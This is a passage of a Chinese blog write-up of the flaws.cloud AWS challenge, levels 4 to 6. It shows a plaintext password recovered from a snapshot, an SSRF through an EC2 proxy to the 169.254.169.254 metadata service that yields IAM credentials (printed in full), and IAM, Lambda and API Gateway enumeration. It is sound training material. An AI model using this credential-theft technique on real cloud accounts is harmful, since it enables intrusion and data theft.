href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/">4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud</a>进行登录，没有成功，应该需要明文密码。</p><p>继续寻找可疑的目录和文件，在/home/ubuntu/中发现了一个可疑脚本<code>setupNginx.sh</code>:</p><pre class="language-shell" data-language="shell"><code class="language-shell">ubuntu@ip-172-31-21-33:/mnt/flaws/home/ubuntu$ <span class="token function">cat</span> setupNginx.shhtpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M</code></pre><p><code>nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M</code>应该就是明文密码。尝试登录，成功通关level 4：</p><p><img src="https://p0.ssl.qhimg.com/t01c66ffd1bf052121f.png"></p><h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h3><ul><li>在AWS中允许创建EC2的快照，这样做的主要目的是进行备份。但当忘记密码时，能够使用快照来访问EC2实例，而这也恰恰是攻击者感兴趣的地方。</li></ul><h2 id="0x06-Level-5"><a href="#0x06-Level-5" class="headerlink" title="0x06 Level 5"></a>0x06 Level 5</h2><blockquote><p>This EC2 has a simple HTTP only proxy on it. Here are some examples of it’s usage:</p><ul><li><a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/</a></li><li><a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml</a></li><li><a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/</a></li></ul><p>See if you can use this proxy to figure out how to list the contents of the level6 bucket at <a href="http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/">level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud</a> that has a hidden directory in it</p></blockquote><p>在EC2实例上有一个简单的HTTP代理，需要用这个代理，找到level 6存储桶中的隐藏目录。</p><p>尝试直接在浏览器中访问<code>level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud</code>，得到的结果是<code>Access Denied</code>:</p><p><img src="https://p3.ssl.qhimg.com/t01294894165c74933a.png"></p><p>level 5 的EC2实例给我们提供了一个代理，目标点应该就在<a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/</a> 里面寻找。</p><p>在level 4中，当我寻找可疑目录或者文件时，在/mnt/flaws/home/ubuntu/.bash_history发现了一些有趣的信息:</p><pre class="language-shell" data-language="shell"><code class="language-shell">ubuntu@ip-172-31-21-33:/mnt/flaws/home/ubuntu$ <span class="token function">cat</span> .bash_history<span class="token punctuation">..</span>.<span class="token function">cat</span> setupNginx.sh<span class="token function">curl</span> <span class="token number">169.254</span>.169.254<span class="token function">curl</span>  http://169.254.169.254/latest/meta-data<span class="token function">wget</span>  http://169.254.169.254/latest/meta-data<span class="token function">cat</span> meta-data<span class="token function">curl</span> -XGET http://169.254.169.254/latest/meta-data<span class="token function">wget</span>  http://169.254.169.254/latest/meta-data/iam<span class="token function">cat</span> iam<span class="token function">wget</span>  http://169.254.169.254/latest/meta-data/iam/info<span class="token function">cat</span> info<span class="token function">rm</span> info iam<span class="token function">ls</span><span class="token function">cat</span> meta-data<span class="token function">curl</span>  http://169.254.169.254/latest/meta-data/iam/info<span class="token function">curl</span>  http://169.254.169.254/latest/meta-data/<span class="token function">curl</span>  http://169.254.169.254/latest/meta-data/profile/<span class="token function">curl</span>  http://169.254.169.254/latest/meta-data/profile<span class="token function">curl</span>  http://169.254.169.254/latest/user-data<span class="token function">curl</span>  http://169.254.169.254/iam/security-credentials/flaws<span class="token function">curl</span>  http://169.254.169.254/iam/security-credentials<span class="token function">curl</span>  http://169.254.169.254/iam/security-credentials/flaws/<span class="token function">curl</span>  http://169.254.169.254/iam/<span class="token function">wget</span> http://169.254.169.254/iam/security-credentials/flaws<span class="token function">curl</span>  http://169.254.169.254/meta-data/iam/security-credentials/flaws<span class="token function">curl</span>  http://169.254.169.254/latest/meta-data/iam/security-credentials/flaws<span class="token function">curl</span>  http://169.254.169.254/latest/meta-data/iam/security-credentials<span class="token function">sudo</span> <span class="token function">su</span> -<span class="token punctuation">..</span>.</code></pre><p>包含<code>169.254.169.254</code>这个IP的几个操作引起了我的注意。<code>169.254.169.254</code>是一个特殊的IP地址，在云服务上（包括AWS），为元数据服务。有关内容可以参见<a href="https://qastack.cn/server/427018/what-is-this-ip-address-169-254-169-254">https://qastack.cn/server/427018/what-is-this-ip-address-169-254-169-254</a> 。</p><p>我们可以用代理来获取自身的元数据，或许能找到一些认证文件或者敏感信息。尝试访问<a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/</a> ，得到一堆文件目录：</p><pre class="language-html" data-language="html"><code class="language-html">ami-idami-launch-indexami-manifest-pathblock-device-mapping/events/hostnameiam/identity-credentials/instance-actioninstance-idinstance-typelocal-hostnamelocal-ipv4macmetrics/network/placement/profilepublic-hostnamepublic-ipv4public-keys/reservation-idsecurity-groupsservices/</code></pre><p>在里面找寻敏感信息，最终在<a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws</a> 找到了泄露出的相关认证信息：</p><pre class="language-html" data-language="html"><code class="language-html">&#123;  "Code" : "Success",  "LastUpdated" : "2020-03-22T13:15:35Z",  "Type" : "AWS-HMAC",  "AccessKeyId" : "ASIA6GG7PSQGTDDQYCXX",  "SecretAccessKey" : "GDgTEgIGzHntptP+d+OCUkh4kCt6OUpFAEwr3Pgp",  "Token" : "IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJHMEUCIQCRhJkGWHi5ic92C1P3CYkQ6y80qrDQOGnDoIz4PwqqbQIgNNna1gE6ze5ChRMPckatRWodHnnjjvyKPR2rhUKWiAEqvwMILhABGgw5NzU0MjYyNjIwMjkiDAFu8gkhNhgSdqABnyqcA1Uf5xMvRGDIGCeB40MAxq+HZNjhrI+EhdtFfpiAFGy6XrKKEekDvXAi9r8NnCd95nQJFdQfQWIXMtSlSjSQFf9o4o3xJ3XveYEVGqMn94t2Ch+LabJkssgeNg8vgJaT/bpagAHou4L2R73JDOg/YaLxCj1VglJlfYnzdY530P/8mW+zX+bhH2CXfGVtEW/lriFWsivYBqHtou8Om0Q34uCegkiHoGjNybToqGmEkMKZcwVzLdJ3cKQbvta2vIJ4dUo99eneSS2IHzojSZNS7ikxM31jJtrTfqIRVNreshgNLPRVxnBrd4V8ceHR7+8wyDRvFqxJ9cBePfUXhVt8xh95eeYLNSyNXJRASjwsNt6XB2au1ragGFRPJj1y2iZLZoUKeeTSqeVMmyN1w7LYjPx9rrui1er+C1t/Ytedd5WG94mJ8zEuQglY0RIcMfAChogIW6ZAq+E3DcJ/ADbuRrtMlqCnK4mq4RuwSrxND9VbA7oKWZVGPVkiFeGosgDtO6Ky/fk1uW7t3jvrzDvgok7mmLrtm3XqqySwlNAw7snd8wU65wFmeTnbDFKx3sVbLZC0/ZIOmUyuOrF3Yy/xyHjuxjKnv2xgt20jT8laVf4skWLExgSyTFxubuR0iYapG+J0dn/or9GiIMPAtXqOD6OGSzi3nDUYJkmO9dp8DTTv2hYWGKzkOLA+LpNYXM5oA50agJBJ1a461ax18xnAgwj1za44+mwW+qf6Ad272mvNgI+xKRgmXHt8OUPhDQdTqyMcQHjRaqmjLNau9Cx2Ks3ddZXlq0J/DSqOp7u7UAspnkO2OAogwvkhYGv0VDfH0W0q9WqvcoAUymJjRTWh6Ncsp+ubt+cUg0OSZuw=",  "Expiration" : "2020-03-22T19:39:11Z"&#125;</code></pre><p>成功获取到一个<code>IAM</code>角色的认证信息。我们将这个认证信息添加到~/.aws/credentials中：</p><pre class="language-txt" data-language="txt"><code class="language-txt">[proxy]aws_access_key_id &#x3D; ASIA6GG7PSQGTDDQYCXXaws_secret_access_key &#x3D; GDgTEgIGzHntptP+d+OCUkh4kCt6OUpFAEwr3Pgpaws_session_token &#x3D; IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJHMEUCIQCRhJkGWHi5ic92C1P3CYkQ6y80qrDQOGnDoIz4PwqqbQIgNNna1gE6ze5ChRMPckatRWodHnnjjvyKPR2rhUKWiAEqvwMILhABGgw5NzU0MjYyNjIwMjkiDAFu8gkhNhgSdqABnyqcA1Uf5xMvRGDIGCeB40MAxq+HZNjhrI+EhdtFfpiAFGy6XrKKEekDvXAi9r8NnCd95nQJFdQfQWIXMtSlSjSQFf9o4o3xJ3XveYEVGqMn94t2Ch+LabJkssgeNg8vgJaT&#x2F;bpagAHou4L2R73JDOg&#x2F;YaLxCj1VglJlfYnzdY530P&#x2F;8mW+zX+bhH2CXfGVtEW&#x2F;lriFWsivYBqHtou8Om0Q34uCegkiHoGjNybToqGmEkMKZcwVzLdJ3cKQbvta2vIJ4dUo99eneSS2IHzojSZNS7ikxM31jJtrTfqIRVNreshgNLPRVxnBrd4V8ceHR7+8wyDRvFqxJ9cBePfUXhVt8xh95eeYLNSyNXJRASjwsNt6XB2au1ragGFRPJj1y2iZLZoUKeeTSqeVMmyN1w7LYjPx9rrui1er+C1t&#x2F;Ytedd5WG94mJ8zEuQglY0RIcMfAChogIW6ZAq+E3DcJ&#x2F;ADbuRrtMlqCnK4mq4RuwSrxND9VbA7oKWZVGPVkiFeGosgDtO6Ky&#x2F;fk1uW7t3jvrzDvgok7mmLrtm3XqqySwlNAw7snd8wU65wFmeTnbDFKx3sVbLZC0&#x2F;ZIOmUyuOrF3Yy&#x2F;xyHjuxjKnv2xgt20jT8laVf4skWLExgSyTFxubuR0iYapG+J0dn&#x2F;or9GiIMPAtXqOD6OGSzi3nDUYJkmO9dp8DTTv2hYWGKzkOLA+LpNYXM5oA50agJBJ1a461ax18xnAgwj1za44+mwW+qf6Ad272mvNgI+xKRgmXHt8OUPhDQdTqyMcQHjRaqmjLNau9Cx2Ks3ddZXlq0J&#x2F;DSqOp7u7UAspnkO2OAogwvkhYGv0VDfH0W0q9WqvcoAUymJjRTWh6Ncsp+ubt+cUg0OSZuw&#x3D;</code></pre><p>尝试使用代理访问：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws --profile proxy s3 <span class="token function">ls</span> s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud                                                                                    PRE ddcc78ff/                                                                                   <span class="token number">2017</span>-02-27 <span class="token number">10</span>:11:07        <span class="token number">871</span> index.html</code></pre><p>成功获得权限进入，并找到隐藏目录<code>ddcc78ff/</code>，访问 <a href="http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/">http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/</a> ，这就是level 6 的入口，成功通关level 5。</p><h3 id="小结：-1"><a href="#小结：-1" class="headerlink" title="小结："></a>小结：</h3><ul><li>IP地址169.254.169.254是云服务中的一个神奇IP，AWS、Azure、谷歌、DigitalOcean等公司都使用它来查找自身的元数据。对于谷歌，对请求有额外的约束，比如要求它使用<code>Metadata-Flavor: Google</code>作为HTTP头，拒绝带有<code>x - forwarding - for</code>头的请求，而在AWS中并没有约束。如果攻击者可以从EC2向该IP发出任何类型的HTTP请求，就很有可能获取到一些敏感信息。这里提供hackerone平台上两篇公开披露的报告用以参考学习：<a href="https://hackerone.com/reports/53088">https://hackerone.com/reports/53088</a> 、<a href="https://hackerone.com/reports/53004">https://hackerone.com/reports/53004</a> 。</li></ul><h2 id="0x07-Level-6"><a href="#0x07-Level-6" class="headerlink" title="0x07 Level 6"></a>0x07 Level 6</h2><blockquote><p>For this final challenge, you’re getting a user access key that has the SecurityAudit policy attached to it. See what else it can do and what else you might find in this AWS account.</p><p>Access key ID: AKIAJFQ6E7BY57Q3OBGA<br>Secret: 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</p></blockquote><p>最后一关提供了一个附加了安全审计策略的用户的认证信息，看看我们能找到什么有趣的信息。</p><p>首先使用AWS CLI 配置这个用户：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws configure --profile flawslevel6AWS Access Key ID <span class="token punctuation">[</span>None<span class="token punctuation">]</span>: AKIAJFQ6E7BY57Q3OBGAAWS Secret Access Key <span class="token punctuation">[</span>None<span class="token punctuation">]</span>: S2IpymMBlViDlqcAnFuZfkVjXrYxZYhP+dZ4ps+uDefault region name <span class="token punctuation">[</span>None<span class="token punctuation">]</span>: us-west-2Default output <span class="token function">format</span> <span class="token punctuation">[</span>None<span class="token punctuation">]</span>:</code></pre><p>在<a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_job-functions.html#jf_security-auditor">AWS的文档</a>中，对<code>SecurityAudit </code>这样描述：</p><blockquote><p><a href="https://console.aws.amazon.com/iam/home#policies/arn:aws:iam::aws:policy/SecurityAudit">SecurityAudit</a></p><p><strong>Use case:</strong> This user monitors accounts for compliance with security requirements. This user can access logs and events to investigate potential security breaches or potential malicious activity.</p><p><strong>Policy description:</strong> This policy grants permissions to view configuration data for many AWS services and to review their logs.</p></blockquote><p>意思就是说：该用户可以访问日志和事件来调查潜在的安全漏洞或潜在的恶意活动，被授予查看一些AWS服务的配置数据和查看其日志的权限。</p><p>在level 3 中，我们查看到了S3存储桶中包含的内容：</p><p><img src="https://p1.ssl.qhimg.com/t01b7bbaeca18c15902.png"></p><p>尝试访问<code>flaws-logs</code>，结果没有权限：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws s3 <span class="token function">ls</span> s3://flaws-logs --profile flawslevel6An error occurred <span class="token punctuation">(</span>AccessDenied<span class="token punctuation">)</span> when calling the ListObjectsV2 operation: Access Denied</code></pre><p>该政策可能涉及到的其他AWS服务包括<code>CloudTrail</code>和<code>CloudWatch</code>，继续尝试访问：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws cloudtrail describe-trails --profile flawslevel6<span class="token punctuation">&#123;</span>    <span class="token string">"trailList"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>            <span class="token string">"IncludeGlobalServiceEvents"</span><span class="token builtin class-name">:</span> true,            <span class="token string">"IsOrganizationTrail"</span><span class="token builtin class-name">:</span> true,            <span class="token string">"Name"</span><span class="token builtin class-name">:</span> <span class="token string">"summitroute-logs"</span>,            <span class="token string">"TrailARN"</span><span class="token builtin class-name">:</span> <span class="token string">"arn:aws:cloudtrail:us-east-1:763647780161:trail/summitroute-logs"</span>,            <span class="token string">"LogFileValidationEnabled"</span><span class="token builtin class-name">:</span> true,            <span class="token string">"IsMultiRegionTrail"</span><span class="token builtin class-name">:</span> true,            <span class="token string">"HasCustomEventSelectors"</span><span class="token builtin class-name">:</span> false,            <span class="token string">"S3BucketName"</span><span class="token builtin class-name">:</span> <span class="token string">"summitroute-logs"</span>,            <span class="token string">"HasInsightSelectors"</span><span class="token builtin class-name">:</span> false,            <span class="token string">"HomeRegion"</span><span class="token builtin class-name">:</span> <span class="token string">"us-east-1"</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span></code></pre><p><code>CloudTrail</code>服务是开启的，那么尝试查看<code>CloudTrail</code>的事件，结果没有权限：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws cloudtrail lookup-events --profile flawslevel6An error occurred <span class="token punctuation">(</span>AccessDeniedException<span class="token punctuation">)</span> when calling the LookupEvents operation: User: arn:aws:iam::975426262029:user/Level6 is not authorized to perform: cloudtrail:LookupEvents</code></pre><p>转换思路，查看此用户的相关信息：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws --profile flawslevel6 iam get-user<span class="token punctuation">&#123;</span>    <span class="token string">"User"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>        <span class="token string">"UserName"</span><span class="token builtin class-name">:</span> <span class="token string">"Level6"</span>,        <span class="token string">"Path"</span><span class="token builtin class-name">:</span> <span class="token string">"/"</span>,        <span class="token string">"CreateDate"</span><span class="token builtin class-name">:</span> <span class="token string">"2017-02-26T23:11:16Z"</span>,        <span class="token string">"UserId"</span><span class="token builtin class-name">:</span> <span class="token string">"AIDAIRMDOSCWGLCDWOG6A"</span>,        <span class="token string">"Arn"</span><span class="token builtin class-name">:</span> <span class="token string">"arn:aws:iam::975426262029:user/Level6"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>得到<code>UserName</code>为<code>Level6</code>，继续查看这个用户的附加策略：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws --profile flawslevel6 iam list-attached-user-policies --user-name Level6<span class="token punctuation">&#123;</span>    <span class="token string">"AttachedPolicies"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>            <span class="token string">"PolicyName"</span><span class="token builtin class-name">:</span> <span class="token string">"list_apigateways"</span>,            <span class="token string">"PolicyArn"</span><span class="token builtin class-name">:</span> <span class="token string">"arn:aws:iam::975426262029:policy/list_apigateways"</span>        <span class="token punctuation">&#125;</span>,        <span class="token punctuation">&#123;</span>            <span class="token string">"PolicyName"</span><span class="token builtin class-name">:</span> <span class="token string">"MySecurityAudit"</span>,            <span class="token string">"PolicyArn"</span><span class="token builtin class-name">:</span> <span class="token string">"arn:aws:iam::975426262029:policy/MySecurityAudit"</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span></code></pre><p>发现附加了<code>list_apigateways</code>的策略，更详细的查看这个策略：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws --profile flawslevel6 iam get-policy  --policy-arn arn:aws:iam::975426262029:policy/list_apigat eways<span class="token punctuation">&#123;</span>    <span class="token string">"Policy"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>        <span class="token string">"PolicyName"</span><span class="token builtin class-name">:</span> <span class="token string">"list_apigateways"</span>,        <span class="token string">"Description"</span><span class="token builtin class-name">:</span> <span class="token string">"List apigateways"</span>,        <span class="token string">"PermissionsBoundaryUsageCount"</span><span class="token builtin class-name">:</span> <span class="token number">0</span>,        <span class="token string">"CreateDate"</span><span class="token builtin class-name">:</span> <span class="token string">"2017-02-20T01:45:17Z"</span>,        <span class="token string">"AttachmentCount"</span><span class="token builtin class-name">:</span> <span class="token number">1</span>,        <span class="token string">"IsAttachable"</span><span class="token builtin class-name">:</span> true,        <span class="token string">"PolicyId"</span><span class="token builtin class-name">:</span> <span class="token string">"ANPAIRLWTQMGKCSPGTAIO"</span>,        <span class="token string">"DefaultVersionId"</span><span class="token builtin class-name">:</span> <span class="token string">"v4"</span>,        <span class="token string">"Path"</span><span class="token builtin class-name">:</span> <span class="token string">"/"</span>,        <span class="token string">"Arn"</span><span class="token builtin class-name">:</span> <span class="token string">"arn:aws:iam::975426262029:policy/list_apigateways"</span>,        <span class="token string">"UpdateDate"</span><span class="token builtin class-name">:</span> <span class="token string">"2017-02-20T01:48:17Z"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>我们得到了这个策略的<code>Arn</code>和<code>DefaultVersionId</code>，能够进一步详细查看：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws --profile flawslevel6 iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list _apigateways --version-id v4<span class="token punctuation">&#123;</span>    <span class="token string">"PolicyVersion"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>        <span class="token string">"CreateDate"</span><span class="token builtin class-name">:</span> <span class="token string">"2017-02-20T01:48:17Z"</span>,        <span class="token string">"VersionId"</span><span class="token builtin class-name">:</span> <span class="token string">"v4"</span>,        <span class="token string">"Document"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>            <span class="token string">"Version"</span><span class="token builtin class-name">:</span> <span class="token string">"2012-10-17"</span>,            <span class="token string">"Statement"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>                <span class="token punctuation">&#123;</span>                    <span class="token string">"Action"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>                        <span class="token string">"apigateway:GET"</span>                    <span class="token punctuation">]</span>,                    <span class="token string">"Resource"</span><span class="token builtin class-name">:</span> <span class="token string">"arn:aws:apigateway:us-west-2::/restapis/*"</span>,                    <span class="token string">"Effect"</span><span class="token builtin class-name">:</span> <span class="token string">"Allow"</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span>,        <span class="token string">"IsDefaultVersion"</span><span class="token builtin class-name">:</span> <span class="token boolean">true</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>发现了这个用户允许使用<code>GET</code>方法访问资源<code>arn:aws:apigateway:us-west-2::/restapis/*</code>。<code>apigateway</code>通常与<code>Lambda</code>函数放在一起使用：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws --region us-west-2 --profile flawslevel6 lambda list-functions<span class="token punctuation">&#123;</span>    <span class="token string">"Functions"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>            <span class="token string">"TracingConfig"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>                <span class="token string">"Mode"</span><span class="token builtin class-name">:</span> <span class="token string">"PassThrough"</span>            <span class="token punctuation">&#125;</span>,            <span class="token string">"Version"</span><span class="token builtin class-name">:</span> <span class="token string">"<span class="token variable">$LATEST</span>"</span>,            <span class="token string">"CodeSha256"</span><span class="token builtin class-name">:</span> <span class="token string">"2iEjBytFbH91PXEMO5R/B9DqOgZ7OG/lqoBNZh5JyFw="</span>,            <span class="token string">"FunctionName"</span><span class="token builtin class-name">:</span> <span class="token string">"Level6"</span>,            <span class="token string">"MemorySize"</span><span class="token builtin class-name">:</span> <span class="token number">128</span>,            <span class="token string">"RevisionId"</span><span class="token builtin class-name">:</span> <span class="token string">"22f08307-9080-4403-bf4d-481ddc8dcb89"</span>,            <span class="token string">"CodeSize"</span><span class="token builtin class-name">:</span> <span class="token number">282</span>,            <span class="token string">"FunctionArn"</span><span class="token builtin class-name">:</span> <span class="token string">"arn:aws:lambda:us-west-2:975426262029:function:Level6"</span>,            <span class="token string">"Handler"</span><span class="token builtin class-name">:</span> <span class="token string">"lambda_function.lambda_handler"</span>,            <span class="token string">"Role"</span><span class="token builtin class-name">:</span> <span class="token string">"arn:aws:iam::975426262029:role/service-role/Level6"</span>,            <span class="token string">"Timeout"</span><span class="token builtin class-name">:</span> <span class="token number">3</span>,            <span class="token string">"LastModified"</span><span class="token builtin class-name">:</span> <span class="token string">"2017-02-27T00:24:36.054+0000"</span>,            <span class="token string">"Runtime"</span><span class="token builtin class-name">:</span> <span class="token string">"python2.7"</span>,            <span class="token string">"Description"</span><span class="token builtin class-name">:</span> <span class="token string">"A starter AWS Lambda function."</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span></code></pre><p>存在一个<code>FunctionName</code>叫做Level6，继续详细查看这个策略：</p><pre class="language-shell" data-language="shell"><code class="language-shell">aws --region us-west-2 --profile flawslevel6 lambda get-policy --function-name Level6<span class="token punctuation">&#123;</span>    <span class="token string">"Policy"</span><span class="token builtin class-name">:</span> <span class="token string">"&#123;<span class="token entity" title="\&quot;">\"</span>Version<span class="token entity" title="\&quot;">\"</span>:<span class="token entity" title="\&quot;">\"</span>2012-10-17<span class="token entity" title="\&quot;">\"</span>,<span class="token entity" title="\&quot;">\"</span>Id<span class="token entity" title="\&quot;">\"</span>:<span class="token entity" title="\&quot;">\"</span>default<span class="token entity" title="\&quot;">\"</span>,<span class="token entity" title="\&quot;">\"</span>Statement<span class="token entity" title="\&quot;">\"</span>:[&#123;<span class="token entity" title="\&quot;">\"</span>Sid<span class="token entity" title="\&quot;">\"</span>:<span class="token entity" title="\&quot;">\"</span>904610a93f593b76ad66ed6ed82c0a8b<span class="token entity" title="\&quot;">\"</span>,<span class="token entity" title="\&quot;">\"</span>Effect<span class="token entity" title="\&quot;">\"</span>:<span class="token entity" title="\&quot;">\"</span>Allow<span class="token entity" title="\&quot;">\"</span>,<span class="token entity" title="\&quot;">\"</span>Principal<span class="token entity" title="\&quot;">\"</span>:&#123;<span class="token entity" title="\&quot;">\"</span>Service<span class="token entity" title="\&quot;">\"</span>:<span class="token entity" title="\&quot;">\"</span>apigateway.amazonaws.com<span class="token entity" title="\&quot;">\"</span>&#125;,<span class="token entity" title="\&quot;">\"</span>Action<span class="token entity" title="\&quot;">\"</span>:<span class="token entity" title="\&quot;">\"</span>lambda:InvokeFunction<span class="token entity" title="\&quot;">\"</span>,<span class="token entity" title="\&quot;">\"</span>Resource<span class="token entity" title="\&quot;">\"</span>:<span class="token entity" title="\&quot;">\"</span>arn:aws:lambda:us-west-2:975426262029:function:Level6<span class="token entity" title="\&quot;">\"</span>,<span class="token entity" title="\&quot;">\"</span>Condition<span class="token entity" title="\&quot;">\"</span>:&#123;<span class="token entity" title="\&quot;">\"</span>ArnLike<span class="token entity" title="\&quot;">\"</span>:&#123;<span class="token entity" title="\&quot;">\"</span>AWS:SourceArn<span class="token entity" title="\&quot;">\"</span>:<span class="token entity" title="\&quot;">\"</span>arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6<span class="token entity" title="\&quot;">\"</span>&#125;&#125;&#125;]&#125;"</span>,    <span class="token string">"RevisionId"</span><span class="token builtin class-name">:</span> <span class="token string">"22f08307-9080-4403-bf4d-481ddc8dcb89"</span><span class="token punctuation">&#125;</span></code></pre><p>发现<code>arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\</code>这样一串有趣的资源信息，其中<code>s33ppypa75</code>为<code>rest-api-id</code>，利用这个信息，进一步查看，得到<code>&quot;stageName&quot;: &quot;Prod&quot;</code>：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws --profile flawslevel6 --region us-west-2 apigateway get-stages --rest-api-id <span class="token string">"s33ppypa75"</span><span class="token punctuation">&#123;</span>    <span class="token string">"item"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>            <span class="token string">"tracingEnabled"</span><span class="token builtin class-name">:</span> false,            <span class="token string">"stageName"</span><span class="token builtin class-name">:</span> <span class="token string">"Prod"</span>,            <span class="token string">"cacheClusterEnabled"</span><span class="token builtin class-name">:</span> false,            <span class="token string">"cacheClusterStatus"</span><span class="token builtin class-name">:</span> <span class="token string">"NOT_AVAILABLE"</span>,            <span class="token string">"deploymentId"</span><span class="token builtin class-name">:</span> <span class="token string">"8gppiv"</span>,            <span class="token string">"lastUpdatedDate"</span><span class="token builtin class-name">:</span> <span class="token number">1488155168</span>,            <span class="token string">"createdDate"</span><span class="token builtin class-name">:</span> <span class="token number">1488155168</span>,            <span class="token string">"methodSettings"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span></code></pre><p>根据AWS的资源端点规则：<code>https://&lt;rest-api-id&gt;.execute-api.&lt;region&gt;.amazonaws.com/&lt;stage-name&gt;/&lt;lambda function&gt;</code>，可以得到最终的资源点位于：<a href="https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6">https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6</a> 。在浏览器中访问地址，返回一串文字：</p><pre class="language-txt" data-language="txt"><code class="language-txt">&quot;Go to http:&#x2F;&#x2F;theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud&#x2F;d730aa2b&#x2F;</code></pre><p>访问给出的网址，成功通关level 6，至此多有挑战全部通关完成：</p><p><img src="https://p2.ssl.qhimg.com/t01e05395f18458bd2d.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过FLAWS的挑战，对涉及到AWS的有关漏洞进行了实践学习，从安全运维人员的角度，可以避免踩坑，配置合理的内容和权限，从漏洞发现挖掘的角度，可以在漏洞发现过程中，尝试可能存在的隐患点、漏洞点，说不定有意外之喜。</p><p>作为一个小白，这篇FLAWS通关记，是为了记录和分享自己的学习过程，分析记录的不到位的地方，还请大佬们收下留情 =）</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>aws</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>goolge ctf 2019 stage1 writeup_part_3</title>
    <link href="/2019/10/02/google_ctf_2019_stage1_writeup_3/"/>
    <url>/2019/10/02/google_ctf_2019_stage1_writeup_3/</url>
    
